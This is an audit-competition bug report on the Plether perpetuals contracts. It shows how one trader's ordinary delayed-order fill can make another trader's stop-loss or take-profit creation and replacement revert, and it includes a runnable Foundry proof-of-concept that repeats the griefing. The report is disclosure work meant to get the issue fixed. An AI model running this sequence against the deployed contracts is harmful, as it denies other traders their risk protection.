# \#99684 [SC-Low] Another trader's historical fill blocks protection creation and replacement

**Submitted on Nov 14th 2026 at 19:37:50 UTC by @Abhan for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99684
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Contract fails to deliver promised returns, but doesn't lose value

## Description


## Brief / Intro

When a delayed order is filled from a valid historical Pyth basket, the router moves the Engine mark forward to that basket's publish time, but `PletherOracle` leaves its own accepted live basket where it was. Stop-loss and take-profit creation and replacement read the accepted basket and require it to be no older than the Engine mark, so after anyone else's ordinary fill they revert with `PletherOracle__PriceOutOfOrder` until someone pushes fresh live Pyth data through `updateMarkPrice`. An unrelated trader can therefore stop another trader from arming or changing protection just by having an ordinary order filled, and can do it again after every refresh. In the PoC, which uses release parameters, the production router, oracle and protection book and only Pyth and USDG mocks, Alice can create protection before Mallory's fill, cannot create or replace it after Mallory's fill moves the Engine mark 2 seconds past the accepted basket, cannot repair it with an empty refresh, and succeeds only after a full live refresh, while Mallory reopens the gap with her next fill.

## Vulnerability Details

The Engine mark and the oracle's accepted live basket are two separate records. A live `updateMarkPrice` updates both of them together. Delayed-order execution takes another path. `PletherOracle._resolveHistoricalOrderBasket` (L596-L645) parses the unique update published after the order's commit time and writes those updates into Pyth storage, but it never writes the oracle's accepted live basket. The router then installs the historical basket as the Engine mark whenever its publish time is newer:

```solidity
// OrderRouterExecutionSidecar.sol L1053-L1061
function _updateEngineMark(
    IOrderRouterExecutionHost host,
    OracleResult memory result
) private {
    ICfdEngineCore engine_ = ICfdEngineCore(host.engine());
    if (result.publishTime > engine_.lastMarkTime()) {
        engine_.updateMarkPrice(result.neutralMarkPrice, result.publishTime);
    }
}
```

After any ordinary historical fill, the Engine mark is therefore ahead of the accepted basket. If the accepted basket was last set at timestamp `100`, a fill can move `engine.lastMarkTime` to `101` while the accepted basket stays at `100`.

Both `createPositionProtection` (PositionProtectionBook.sol L207-L230) and `replacePositionProtection` (L257-L295) go through `_freshProtectionObservation`, which reads the oracle's current accepted `MarkRefresh` snapshot:

```solidity
// PositionProtectionBook.sol L872-L882 (_freshProtectionObservation)
uint64 markTime = ENGINE.lastMarkTime();
cachedMarkPrice = ENGINE.lastMarkPrice();
if (
    cachedMarkPrice == 0 || markTime == 0
        || OracleFreshnessPolicyLib.isStale(markTime, policy.maxStaleness, block.timestamp)
) {
    revert OrderRouter__ProtectionMarkTooStale();
}
IPletherOracle.PriceSnapshot memory current = oracle.getLatestPrice(IPletherOracle.PriceMode.MarkRefresh);
currentMarkPrice = current.markPrice;
currentPublishTime = current.publishTime;
```

Building that snapshot enforces publish order against the Engine mark:

```solidity
// PletherOracle.sol L892-L896 (_snapshotFromBasket)
if (enforcePublishOrder) {
    uint64 markTime = engine.lastMarkTime();
    if (snapshot.publishTime < markTime) {
        revert PletherOracle__PriceOutOfOrder(snapshot.publishTime, markTime);
    }
```

With the accepted basket at `100` and the Engine mark at `101`, Alice's call reverts with `PletherOracle__PriceOutOfOrder(100, 101)` before the protection is created or replaced. Mallory, who caused this, never touches Alice's account: she only commits an ordinary order of her own that a keeper fills at the FIFO head with a valid post-commit basket. This read of the accepted `MarkRefresh` snapshot is how the protection book was changed in response to Cecuro MED-28, which covered the opposite case of an accepted basket ahead of a stale Engine mark; here a normal historical fill moves the Engine ahead of the accepted basket instead.

An empty-data `updateMarkPrice` does not help, because it replays the older accepted basket and also reverts. Alice or a keeper can repair the state only by submitting valid live Pyth data through `updateMarkPrice`, which brings the accepted basket up to the Engine mark, and then retrying the protection call. That repair works in the same timestamp, but Mallory can fill another ordinary order after any refresh and open the gap again.

## Impact Details

Plether offers stop-loss and take-profit protection that a trader can arm or change at any time, and the contracts do not deliver that after any other trader's ordinary fill. Alice's documented protection call fails and wastes gas. If she is arming her first stop-loss, her position stays without it until a live refresh and a successful retry. If she is replacing an existing protection, the old triggers and limits stay in force instead of her new instructions. Each further fill by Mallory forces the same refresh-and-retry sequence again. Mallory needs no permission over Alice's position or the oracle configuration, only the normal costs of her own order and eligible signed Pyth data. No funds are lost: the position and any existing protection stay intact, and the call goes through once a live refresh lands before it.

## Recommendation

Keep the oracle's accepted live basket in step with the Engine mark when a historical fill moves the mark forward, or give protection creation and replacement an atomic path that takes live Pyth data and refreshes the mark before the protection checks run, while keeping the oracle's publish-order check so that protection never silently uses a basket older than the Engine mark.

## References

The historical order path does not update the accepted live basket: [PletherOracle.sol#L596-L645](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol?plain=1#L596-L645)

The router installs the historical basket as the Engine mark: [OrderRouterExecutionSidecar.sol#L1053-L1061](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol?plain=1#L1053-L1061)

Protection creation and replacement read the accepted `MarkRefresh` snapshot: [PositionProtectionBook.sol#L862-L884](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol?plain=1#L862-L884)

The snapshot reverts when it is older than the Engine mark: [PletherOracle.sol#L878-L903](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol?plain=1#L878-L903)

## Proof of Concept

## Proof of Concept

The vulnerability is demonstrated by a runnable Foundry test against the audit repository, `immunefi-team/audit-comp-plether` at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. The complete test code is included at the end of this section.

The test extends the repository's own `BasePerpTest` harness (`packages/perps/test/perps/BasePerpTest.sol`) and does not modify any contract under `src/`. The only mocks are the repository's Pyth and USDG test contracts. Every order goes through the production V3 entry point `IPerpsTraderActions.commitOrder(OrderRequest)` and is filled by an arbitrary keeper through `router.executeOrder` with a signed basket published one second after the commit. Protection is created and replaced through the production `PositionProtectionBook`, mark refreshes go through the permissionless `router.updateMarkPrice`, and the LP deposit uses the public request → `router.settleLpEpoch` → claim flow. No protocol contract is impersonated. The test applies the release parameters from `DEPLOYMENT.md`.

### Step-by-step (`test_OtherTraderHistoricalFillBlocksProtectionButSameSecondRefreshRepairs`)

**Setup.** An LP deposits 10,000,000 USDG of Junior. On Tuesday 10:00 UTC, Alice opens a 10,000-token LONG and Mallory opens a separate 10,000-token SHORT.

**In sync.** A keeper submits a live refresh, so the accepted basket and the Engine mark share the same time. From a snapshot of this state, Alice's `createPositionProtection` with a stop-loss at 1.05 succeeds.

**Mallory's fill.** Mallory commits a 100-token SHORT increase, and a keeper fills it two seconds later from the basket published one second after the commit. The Engine mark moves 2 seconds past the accepted basket.

**Blocked.** Alice's `createPositionProtection` now reverts with `PletherOracle__PriceOutOfOrder`, and an `updateMarkPrice` call with empty data also reverts.

**Repair.** Alice submits a full live refresh, and her `createPositionProtection` then succeeds in the same timestamp.

### Other scenarios covered by the test

`test_OtherTraderHistoricalFillAlsoBlocksReplacementUntilRefresh` creates Alice's protection first. After Mallory's fill, `replacePositionProtection` with a new stop-loss at 1.06 reverts with `PletherOracle__PriceOutOfOrder`, an empty refresh also reverts, and the replacement succeeds only after a full live refresh, so until then the old trigger stays in force.

`test_OtherTraderCanRecreateTheGapAfterEachLiveRefresh` runs two rounds of live refresh followed by a Mallory fill. After each round Alice's creation reverts with `PletherOracle__PriceOutOfOrder`, and it succeeds only once a live refresh lands with no fill in between.

### How to run

```bash
git clone https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
mkdir -p packages/perps/test/poc
# save the test code below as packages/perps/test/poc/HistoricalFillBlocksProtection.t.sol
cd packages/perps
FOUNDRY_TEST=test/poc FOUNDRY_SCRIPT=test/poc forge test --match-path test/poc/HistoricalFillBlocksProtection.t.sol -vv
```

The two `FOUNDRY_*` variables limit compilation to the PoC. The package builds with via-IR, so compiling its whole test suite takes much longer; running without them also works. Expected result: `Suite result: ok. 3 passed; 0 failed; 0 skipped`, with the accepted-basket and Engine-mark times in the logs.

### PoC code

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IPerpsTraderActions} from "@plether/perps/interfaces/IPerpsTraderActions.sol";
import {IPletherOracle} from "@plether/perps/interfaces/IPletherOracle.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @title A valid historical fill by one trader makes another trader's protection creation and replacement revert
/// @notice A delayed order is priced from the first post-commit Pyth update and the Router installs that historical
///         basket as the Engine mark, but the Oracle's accepted live basket is not updated. Protection creation and
///         replacement read the accepted `MarkRefresh` snapshot, which must not be older than the Engine mark, so they
///         revert `PletherOracle__PriceOutOfOrder` until someone submits a fresh live update.
/// @dev Release parameters from packages/perps/DEPLOYMENT.md. Production V3 `commitOrder`, the production
///      PositionProtectionBook, and permissionless `executeOrder` / `updateMarkPrice` / `settleLpEpoch`. Pyth and USDG
///      are the only mocks. No contract under src/ is modified or impersonated.
contract HistoricalFillBlocksProtectionTest is BasePerpTest {

    address internal constant ALICE = address(0xA11CE); // trader managing her own protection
    address internal constant MALLORY = address(0x3A11); // unrelated trader who fills an ordinary order
    address internal constant KEEPER = address(0xBEEF);
    address internal constant LP = address(0x1B);

    uint256 internal constant PRICE = 1e8;
    uint256 internal constant TUE_NOV10_1000 = 1_794_304_800; // Tue 2026-11-10 10:00:00 UTC (regular trading)

    IPositionProtectionActions internal actions;

    // ------------------------------------------------------------------------------------------------------------
    // Release configuration
    // ------------------------------------------------------------------------------------------------------------

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = 2500;
        _setRouterConfig(config);
        actions = IPositionProtectionActions(address(router.positionProtectionBook()));

        // The admin timelocks above end inside a weekend closure; resume on the next Monday 10:00 UTC.
        vm.warp(SETUP_TIMESTAMP + 7 days);
        _publicJuniorDeposit(LP, 10_000_000e6);

        _goto(TUE_NOV10_1000);
        assertFalse(engine.isOracleFrozen(), "regular trading hours");
        _fundTrader(ALICE, 100_000e6);
        _fundTrader(MALLORY, 100_000e6);
        _liveRefresh(KEEPER);

        // Alice and Mallory hold separate positions.
        _commitAndFill(ALICE, CfdTypes.Side.LONG, 10_000e18, 2000e6);
        _commitAndFill(MALLORY, CfdTypes.Side.SHORT, 10_000e18, 2000e6);
    }

    // ------------------------------------------------------------------------------------------------------------
    // Helpers (public entry points only)
    // ------------------------------------------------------------------------------------------------------------

    function _goto(
        uint256 timestamp
    ) internal {
        require(timestamp >= vm.getBlockTimestamp(), "time moves forward");
        vm.warp(timestamp);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _payload(
        uint256 publishTime
    ) internal pure returns (bytes[] memory data) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i],
                MockPyth.MockPrice(SafeCast.toInt64(SafeCast.toInt256(PRICE)), 0, -8, publishTime, publishTime - 1)
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(ticks);
    }

    /// @dev Live `updateMarkPrice` with a basket published now. It synchronizes the accepted basket and the Engine mark.
    function _liveRefresh(
        address caller
    ) internal {
        bytes[] memory data = _payload(vm.getBlockTimestamp());
        vm.prank(caller);
        router.updateMarkPrice(data);
    }

    function _publicJuniorDeposit(
        address lp,
        uint256 amount
    ) internal {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(juniorVault), amount);
        uint256 requestId = juniorVault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        _goto(juniorVault.depositEpochStart(requestId));
        bytes[] memory data = _payload(vm.getBlockTimestamp());
        vm.prank(KEEPER);
        router.settleLpEpoch(data);
        assertEq(juniorVault.claimableDepositRequest(requestId, lp), amount, "deposit activated in full");
        vm.prank(lp);
        juniorVault.claimDeposit(requestId, amount, lp, lp);
    }

    /// @dev Commits an open at time c and has a keeper fill it at c+2 with the unique post-commit basket published at
    ///      c+1. This is an ordinary historical fill: it moves the Engine mark to c+1.
    function _commitAndFill(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin
    ) internal returns (uint64 orderId) {
        _goto(vm.getBlockTimestamp() + 1);
        uint256 c = vm.getBlockTimestamp();
        uint256 window = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(account, router.nextCommitId())),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: side == CfdTypes.Side.LONG ? 1 : type(uint256).max,
            isClose: false,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(c + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(account);
        orderId = IPerpsTraderActions(address(router)).commitOrder(request);
        _goto(c + 2);
        bytes[] memory data = _payload(c + 1);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(orderId, data);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "fill executed");
    }

    function _params(
        uint256 stopLoss
    ) internal pure returns (PositionProtectionTypes.PositionProtectionParams memory p) {
        p.stopLossTriggerPrice = stopLoss; // LONG loses when the basket rises: stop-loss above the mark
        p.closeLimits.maxExecutionNotionalAssets = type(uint256).max;
        p.closeLimits.maxGrossAccountDebitAssets = type(uint256).max;
        p.closeLimits.maxActionChargeAssets = type(uint256).max;
        p.closeLimits.maxExplicitFeesAssets = type(uint256).max;
    }

    function _tryCreate() internal returns (bool ok, bytes memory err, uint64 id) {
        PositionProtectionTypes.PositionProtectionParams memory p = _params(1.05e8);
        vm.prank(ALICE);
        try actions.createPositionProtection(p) returns (uint64 protectionId) {
            ok = true;
            id = protectionId;
        } catch (bytes memory reason) {
            err = reason;
        }
    }

    function _tryReplace(
        uint64 id
    ) internal returns (bool ok, bytes memory err) {
        PositionProtectionTypes.PositionProtectionParams memory p = _params(1.06e8);
        vm.prank(ALICE);
        try actions.replacePositionProtection(id, p) {
            ok = true;
        } catch (bytes memory reason) {
            err = reason;
        }
    }

    function _assertPriceOutOfOrder(
        bytes memory err
    ) internal pure {
        assertEq(bytes4(err), IPletherOracle.PletherOracle__PriceOutOfOrder.selector, "PriceOutOfOrder");
    }

    /// @dev Live refresh at the current Engine time, then Mallory fills, leaving the accepted basket behind.
    function _syncThenMalloryFills() internal {
        _goto(vm.getBlockTimestamp() + 1);
        _liveRefresh(KEEPER);
        uint256 accepted = vm.getBlockTimestamp();
        _commitAndFill(MALLORY, CfdTypes.Side.SHORT, 100e18, 50e6);
        console2.log("accepted live basket time ", accepted);
        console2.log("engine mark time after fill", engine.lastMarkTime());
        assertGt(engine.lastMarkTime(), accepted, "historical fill moved the Engine mark past the accepted basket");
    }

    function _emptyRefreshReverts() internal {
        bytes[] memory empty = new bytes[](0);
        vm.prank(ALICE);
        (bool ok,) = address(router).call(abi.encodeCall(router.updateMarkPrice, (empty)));
        assertFalse(ok, "an empty-data refresh replays the older accepted basket and reverts");
    }

    // ------------------------------------------------------------------------------------------------------------
    // Tests
    // ------------------------------------------------------------------------------------------------------------

    /// @notice Alice can create protection before Mallory's fill. After it, creation reverts `PriceOutOfOrder`, an
    ///         empty refresh does not help, and creation succeeds only after a full live refresh (same timestamp).
    function test_OtherTraderHistoricalFillBlocksProtectionButSameSecondRefreshRepairs() public {
        _goto(vm.getBlockTimestamp() + 1);
        _liveRefresh(KEEPER);
        uint256 snap = vm.snapshotState();
        (bool okBefore,,) = _tryCreate();
        assertTrue(okBefore, "creation works while the records are in sync");
        vm.revertToState(snap);

        uint256 accepted = vm.getBlockTimestamp();
        _commitAndFill(MALLORY, CfdTypes.Side.SHORT, 100e18, 50e6);
        console2.log("accepted live basket time ", accepted);
        console2.log("engine mark time after fill", engine.lastMarkTime());

        (bool ok, bytes memory err,) = _tryCreate();
        assertFalse(ok, "creation reverts after Mallory's fill");
        _assertPriceOutOfOrder(err);

        _emptyRefreshReverts();

        uint256 t = vm.getBlockTimestamp();
        _liveRefresh(ALICE);
        (ok,,) = _tryCreate();
        assertTrue(ok, "creation works after a full live refresh");
        assertEq(vm.getBlockTimestamp(), t, "repaired in the same timestamp");
    }

    /// @notice The same failure and repair for replacing an existing protection: the old trigger stays in force until
    ///         a live refresh lets the replacement through.
    function test_OtherTraderHistoricalFillAlsoBlocksReplacementUntilRefresh() public {
        _goto(vm.getBlockTimestamp() + 1);
        _liveRefresh(KEEPER);
        (bool created,, uint64 id) = _tryCreate();
        assertTrue(created, "protection created");

        _syncThenMalloryFills();
        (bool ok, bytes memory err) = _tryReplace(id);
        assertFalse(ok, "replacement reverts after Mallory's fill");
        _assertPriceOutOfOrder(err);
        _emptyRefreshReverts();

        _liveRefresh(ALICE);
        (ok,) = _tryReplace(id);
        assertTrue(ok, "replacement works after a full live refresh");
    }

    /// @notice Mallory can recreate the gap after each live refresh: fill, failed protection call, refresh, twice.
    function test_OtherTraderCanRecreateTheGapAfterEachLiveRefresh() public {
        for (uint256 round = 1; round <= 2; ++round) {
            _syncThenMalloryFills();
            (bool ok, bytes memory err,) = _tryCreate();
            assertFalse(ok, "creation reverts after the fill");
            _assertPriceOutOfOrder(err);
            console2.log("round with a failed protection call", round);
        }
        _liveRefresh(ALICE);
        (bool okFinal,,) = _tryCreate();
        assertTrue(okFinal, "creation works once nobody fills between the refresh and the call");
    }

}
```

